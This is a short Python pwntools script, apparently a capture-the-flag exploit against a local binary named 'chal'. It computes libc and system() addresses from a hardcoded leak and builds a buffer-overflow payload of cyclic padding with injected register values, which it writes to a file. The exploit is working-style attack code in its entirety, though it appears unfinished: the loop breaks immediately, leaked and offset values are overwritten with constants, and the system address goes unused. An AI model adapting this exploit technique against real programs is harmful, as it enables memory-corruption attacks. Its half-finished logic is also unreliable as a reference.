from pwn import *
import time

for offset in range(0, 50000,8):
    p = process("./chal")
    gets = p.recvuntil("\n").decode("utf-8").strip("]\n").split(" ")[1]
    print(gets)
    gets = int(gets, 16)

    gets = 0x7ffff7e4b970
    libc = gets - 0x0000000000083970
    system = libc + 0x0000000000052290

    with open("offset", 'r') as f:
        offset = int(f.read())
    offset = 0    

    first_rax = p64(0x59cf40)
    # first_rax = p64(0xdeadbeef)

    sec_rax = p64(0x59cf40)

    with open("offset", 'w') as f:
        f.write(str(offset+1))

    payload = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa" + sec_rax +b"gaaaaaaahaaaaaaaiaaaaaaa"+first_rax+b"kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa"
    
    break    

with open('./output', 'wb') as f:
    f.write(payload)